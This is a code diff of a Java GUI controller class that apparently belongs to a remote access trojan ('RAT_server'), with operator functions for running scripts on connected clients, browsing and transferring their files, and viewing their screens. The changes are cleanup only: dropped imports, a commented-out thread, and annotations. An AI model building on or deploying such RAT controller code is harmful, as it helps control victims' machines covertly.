@@ -9,24 +9,17 @@ import java.util.ArrayList;
 import java.util.Collections;
 import java.util.List;
 import java.util.Optional;
-import org.json.simple.JSONObject;
-
 import electron.RAT_server;
 import electron.actions.Explorer;
 import electron.actions.Misc;
 import electron.actions.Scripting;
 import electron.actions.Taskmgr;
-import electron.networking.FileReceiver;
-import electron.networking.FileSender;
-import electron.networking.Listener;
 import electron.networking.NetData;
 import electron.networking.ScreenV2Receiver;
 import electron.networking.SocketHandler;
 import electron.networking.packets.ClientInfo;
 import electron.networking.packets.ProcessPacket;
-import electron.networking.packets.ScriptFilePacket;
 import electron.networking.packets.ExplorerPacketInput;
-import electron.networking.packets.ExplorerPacketOutput;
 import electron.networking.packets.OutputPacket;
 import electron.utils.Utils;
 import electron.utils.logger;
@@ -174,14 +167,6 @@ public class MainWindowControls {
 				explorer_openAction();
 			}
 		});
-
-		// Creating update thread
-//		ScheduledExecutorService executor = Executors.newScheduledThreadPool(1);
-//		executor.scheduleAtFixedRate(() -> {
-//			Platform.runLater(() -> {
-//				viewChaged();
-//			});
-//		}, 0, Integer.parseInt(settings_uitimeupdater.getText()), TimeUnit.MICROSECONDS);
 		Runnable updateRunnable = new Runnable() {
 			@SuppressWarnings("static-access")
 			@Override
@@ -320,7 +305,6 @@ public class MainWindowControls {
 					"Select client in 'Connections' pane firstly.", false);
 			return;
 		}
-		// Executing script
 		String script = script_code.getText();
 		String type = script_executor.getSelectionModel().getSelectedItem();
 		Scripting.executeScript(handler, script, type, false);
@@ -702,7 +686,6 @@ public class MainWindowControls {
 		Explorer.play(handler, explorer_path.getText(), explorer_list.getSelectionModel().getSelectedItem(), false);
 	}
 
-	@SuppressWarnings("unchecked")
 	@FXML
 	private void explorer_upload() {
 		if (handler == null) {
@@ -719,7 +702,6 @@ public class MainWindowControls {
 		}
 	}
 
-	@SuppressWarnings("unchecked")
 	@FXML
 	private void explorer_download() {
 		if (handler == null) {
